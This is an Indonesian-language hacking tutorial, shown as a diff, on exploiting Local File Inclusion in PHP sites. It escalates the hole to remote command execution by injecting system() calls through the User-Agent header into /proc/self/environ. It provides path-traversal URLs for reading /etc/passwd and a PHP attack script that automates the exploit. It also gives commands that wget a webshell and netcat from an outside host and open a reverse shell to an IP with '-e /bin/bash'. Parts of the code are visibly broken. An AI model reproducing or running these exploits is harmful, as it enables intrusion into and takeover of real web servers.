@@ -1,0 +1,328 @@
+Exploitasi LFI dengan injeksi Environ
+Oleh Safwan Zainuddin pada Senin, 24 September 2012 pukul 17.31
+
+Kali ini saya mencoba memberikan tutorial Hacking dengan teknik Explitasi LFI atau biasa disebut dengan Local File Inclusion.
+
+Metodae LFI ini sama halnya dengan metode RFI atau Remote Command Execution yang tutorialnya saya akan bahas nanti.
+
+Perbedaan antara keduanya adalah teknik hacking dengan metode RFI dilakukan dengan cara mengincludekan file secara remote.Sedangkan teknik Hacking LFI maka kita bisa mengincludekan file yang ada di komputer victim secara langsung.Dari situlah kita bisa menyusup ke server target secara lebih dalam.
+
+Banyak metode yang bisa kita lakukan,misalnya dengan menginjeksi apache log access,dll.
+
+mengenai teknik apache log injection saya akan bahas nanti.
+
+ 
+
+  Pada tutorial kali ini,saya coba menjelaskan bagaimana membuat sebuah Remote Command Execution (RCE) pada LFI dengan memanfaatkan ENVIRON (/proc/self/environ). Bagaimana file environ ini bisa menjadi sebuah RCE melalui LFI? jawabanya simple, karena kita bisa menginclude file environ ini, dan kita bisa memanipulasi header browser kita untuk mengirim membuat sebuah RCE dan mengexploitasinya.
+
+ 
+
+teknik injeksi LFI,seperti pada umumnya,kita harus menemukan dulu direktori utama dari server ini.Teknik kuno yang ampuh adalah dengan mencoba satu persatu, dan menaikan ke tingkat direktori di atasnya.
+
+ 
+
+Perhatikan ::
+
+ 
+
+http://site.com/buglfi.php?exp=../etc/passwd <<< percobaan pertama naik 1 direktori di atas.
+
+bila gagal, naikan lagi ke direktori di atasnya lagi ::
+
+ 
+
+http://site.com/buglfi.php?exp=../../etc/passwd
+
+http://site.com/buglfi.php?exp=../../../etc/passwd
+
+http://site.com/buglfi.php?exp=../../../../etc/passwd <<< terus naik sampai file /etc/passwd terinclude.
+
+contoh isi dari /etc/passwd
+
+ 
+
+root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+
+ 
+
+bila menemui halaman berisi seperti itu, berarti sudah ketemu letak direktori root. misal :
+
+http://site.com/buglfi.php?exp=../../../../../etc/passwd
+
+itu adalah teknik mendasar dari LFI. teknik tersebut tetep di perlukan untuk menemukan direktori root.
+
+ 
+
+next, seperti yang saya katakan tadi, kita akan membuat RCE melalui ENVIRON.
+
+ 
+
+Langsung aja kita include file environ ini.
+
+http://site.com/buglfi.php?exp=../../../../../proc/self/environ
+
+injek dan dapatkan output dari file ini. apa yang terlihat?
+
+DOCUMENT_ROOT=/home/rialto/public_html?GATEWAY_INTERFACE=CGI/1.1?HTTP_ACCEPT=text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5?HTTP_ACCEPT_CHARSET=ISO-8859-1,utf-8;q=0.7,*;q=0.7?HTTP_ACCEPT_ENCODING=gzip,deflate?HTTP_ACCEPT_LANGUAGE=en-us,en;q=0.5?HTTP_CONNECTION=keep-alive?HTTP_HOST=www.site.com?HTTP_KEEP_ALIVE=300?HTTP_USER_AGENT=Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.14) Gecko/20080404
+
+perhatikan output tersebut. amati apa yg tampak. cari2 apa yang bisa kita manfaatkan. cari detil demi detil. putar otak kiri kanan atas bawah.pasti ketemu
+
+perhatikan text yang tak tebalkan. itu adalah user agent. informasi yang di berikan oleh "browser kita" ke server. yg berarti informasi tersebut "di kirim oleh browser kita" ke server.itu muncul mozilla karena gw emang pakai mozilla firefox. info itu di kirim oleh browser ke server victim.
+
+sekarang kita ingat hal penting dalam Hacking, pengetahuan basic dari webhacking :
+
+"sesuatu (input,variable,script) yang di kirimkan dari browser, bisa di manipulasi melalui browser agar di proses oleh server".
+
+ 
+
+Lalu apa hubunganya hal ini dengan inject environ? simple sob. Perhatikan output yang kita terima setelah kita menginclude file environ. informasi useragent dari browser kita di tampilkan oleh file ini, berarti kita bisa memanipulasi user agent ini sesuai yang kita inginkan. Salah satunya mengirimkan perintah jahat ke victim ((demit mode on)).
+
+ 
+
+Untuk manipulasi header ini, ada cara yg sangat mudah, yaitu dengan menggunakan addons firefox bernama tamper. tapi saya tidak akan menggunakan cara instan seperti itu, karena kita sedang belajar. Jadi saya akan jelaskan Proof Of Concept nya semampu saya.
+
+ 
+
+OK. Next --> Coding.
+
+saya harap kalian tidak bosan sama coding. karena kita hidup di dunia 0 dan 1, jadi mau tidak mau harus selalu berususan dengan coding.
+
+ 
+
+###[ HTTPQUERY pada PHP ]###
+
+http query berfungsi untuk melakukan koneksi ke sebuah host melalui protokol http, kemudian mengambil output dari hasil query. ringkasnya httpquery bersifat seperti web browser.
+
+$sock = fsockopen("sasaran.com","80",$errno,$errstr,30); // lakukan koneksi ke sasaran.com port 80
+
+$get = "GET /index.php HTTP/1.1\r\n". // minta file index.php (browsing membuka file index.php)
+
+"Host: sasaran.com\r\n". // hostname
+
+"Accept: */*\r\n". // accepted methode
+
+"User-Agent: Mozilla/5.0 \r\n". // USER AGENT
+
+"Connection: Close\r\n\r\n"; // tutup koneksi
+
+fputs($sock,$get); // kirimkan request
+
+while (!feof($sock)) { // ambil output yg di terima dari hasil kirim request
+
+$output .= trim(fgets($sock, 3600))."\n";
+
+}
+
+fclose($sock); // tutup koneksi
+
+echo $output; // tulis/cetak hasil httpquery
+
+?>
+
+dengan cara seperti ini, kita akan mendapatkan hasil yang sama dengan browsing menggunakan browser. bedanya kita bebas mengirimkan header http apa aja. perhatikan bagian USER AGENT. di situ saya tuliskan Mozilla/5.0. sehingga informasi browser yang di terima oleh sasaran.com adalah Mozilla/5.0. Kalau user agent saya isi dengan nama saya, maka server akan mengetahui kalau useragent adalah Qubex.
+
+"User-Agent: ArRay \r\n"
+
+sehingga, hasil output ke browser, akan tertulis useragent adalah Qubex.
+
+dengan cara seperti ini, kita bisa menyisipkan malicious code ke server.
+
+"User-Agent: Mozilla/5.0 \r\n"
+
+dengan cara seperti itu, maka shell command uname -a dan ls -la akan di jalankan di sasaran.com dan hasilnya di cetak di browser. jadilah sebuah teknik menginjeksi yg mudah. begitulan PoC dasar dari teknik ini.
+
+ 
+
+$sock = fsockopen("sasaran.com","80",$errno,$errstr,30);
+
+$get = "GET /index.php HTTP/1.1\r\n".
+
+"Host: sasaran.com\r\n".
+
+"Accept: */*\r\n".
+
+"User-Agent: Mozilla/5.0 \r\n".
+
+"Connection: Close\r\n\r\n";
+
+fputs($sock,$get);
+
+while (!feof($sock)) {
+
+$output .= trim(fgets($sock, 3600))."\n";
+
+}
+
+fclose($sock);
+
+echo $output;
+
+?>
+
+ 
+
+dengan merubah user agent, kita bisa mengirimkan command apa saja ke server. sebuah malicious yang mudah dan menyenangkan. kita bisa merubahnya dan menjalankan satu demi satu.
+
+ 
+
+seperti yang saya katakan tadi, kita akan membuat sebuah RCE. Sehingga kita bisa mengirimkan command2 ke server dengan mudah layaknya menginjeksi bug RCE, tanpa harus edit2 coding lagi. kita tinggal mengedit code tersebut menjadi lebih otomatis.
+
+ 
+
+contoh berikut, saya membuat scriptnya untuk di jalankan di command line interface. dengan script berikut, saya akan mengirimkan command ke server dengan cara berikut (in CLI misanl SSH):
+
+./lfi "http://sasaran.com/buglfi.php?example=[command-command ke server]"
+
+./lfi "http://sasaran.com/buglfi.php?example=[uname -a; pwd; ls -la; find ./ -perm 777 -type d]" << contoh
+
+ 
+
+#!/usr/bin/php
+
+//ambil variable
+
+$com = str_replace('"','',$_SERVER['argv'][1]); // hilangkan petik
+
+$sub = explode("[",$com); // pisah bug dengan command
+
+$url = str_replace("http://","",$sub[0]); // url
+
+$site= explode("/",$url,0); // sitename
+
+$bug = str_replace($site."/","",$url); // bug path
+
+$cmd = substr($sub[1],0,(str_len($sub[1])-1)); // command
+
+ 
+
+//dapatkan path direktori utama
+
+$path = '/';
+
+while(!$mainpath){
+
+$output = false;
+
+$sock = fsockopen($site,"80",$errno,$errstr,15);
+
+$get = "GET /".$bug.$path"etc/passwd HTTP/1.1\r\n".
+
+"Host: ".$site."\r\n".
+
+"Accept: */*\r\n".
+
+"User-Agent: Mozilla/5.0\r\n".
+
+"Connection: Close\r\n\r\n";
+
+fputs($sock,$get);
+
+while (!feof($sock)) {
+
+$output .= trim(fgets($sock, 3600))."\n";
+
+}
+
+fclose($sock);
+
+if(eregi("root:",$output)){
+
+$mainpath = $path;
+
+}
+
+$path .= "../";
+
+}
+
+ 
+
+// hentikan exploitasi jika tidak mendapatkan main direktori path
+
+if(!$mainpath){
+
+print "Failed!\r\n"; exit();
+
+}
+
+ 
+
+//injek environ
+
+$output = false;
+
+$sock = fsockopen($site,"80",$errno,$errstr,15);
+
+$get = "GET /".$bug.$mainpath"proc/self/environ HTTP/1.1\r\n".
+
+"Host: ".$site."\r\n".
+
+"Accept: */*\r\n".
+
+"User-Agent: Mozilla/5.0 '.system('".$cmd."').'[XCREW]';\r\n".
+
+"Connection: Close\r\n\r\n";
+
+fputs($sock,$get);
+
+while (!feof($sock)) {
+
+$output .= trim(fgets($sock, 3600))."\n";
+
+}
+
+fclose($sock);
+
+ 
+
+//failed jika tidak bisa include environ/gagal
+
+if(!eregi("[XCREW]",$output)){
+
+print "Failed!\r\n"; exit();
+
+}
+
+ 
+
+//ambil output command
+
+$result = explode("[XCREW]",$output);
+
+$hasilcommand = $result[1];
+
+ 
+
+print $hasilcommand."\r\n";
+
+exit();
+
+?>
+
+dengan script sederhana tersebut, saya dapat RCE dari LFI.
+
+ 
+
+####[ Scenario download webshell ]####
+
+./lfi "http://sasaran.com/buglfi.php?example=[find ./ -type d -perm 777]"
+
+./lfi "http://sasaran.com/buglfi.php?example=[cd writeable/dir/; wget http://shell.ku/bd.txt; mv bd.txt bd.php]"
+
+Shell uploaded to http://sasaran.com/writeable/dir/bd.php
+
+ 
+
+####[ Scenario backconnect ]####
+
+./lfi "http://sasaran.com/buglfi.php?example=[find ./ -type d -perm 777]"
+
+./lfi "http://sasaran.com/buglfi.php?example=[cd writeable/dir/; wget http://shell.ku/nc;]"
+
+./lfi "http://sasaran.com/buglfi.php?example=[writeable/dir/nc -vv 202.212.22.11 9999 -e /bin/bash &]"
+
+ 
+
+ 
+
+begitulah, salah satu jurus Hackin exploitasi LFI. pada teknik ini, selain belajar teknik lfi, kita juga secara tidak langsung belajar untuk mengirimkan command dengan manipulasi header http yang memanfaatkan sifat dari server. teknik seperti ini juga bisa di pakai pada bug lain yang memiliki sifat yg sama, yaitu mencetak informasi yang dikirim dari browser. karena, segala sesuatu yang di kirimkan dari browser bisa kita manipulasi sesuka kita. ini adalah hukum alam. kembangin sendiri script tersebut. sempurnain, karena itu juga asal ketik
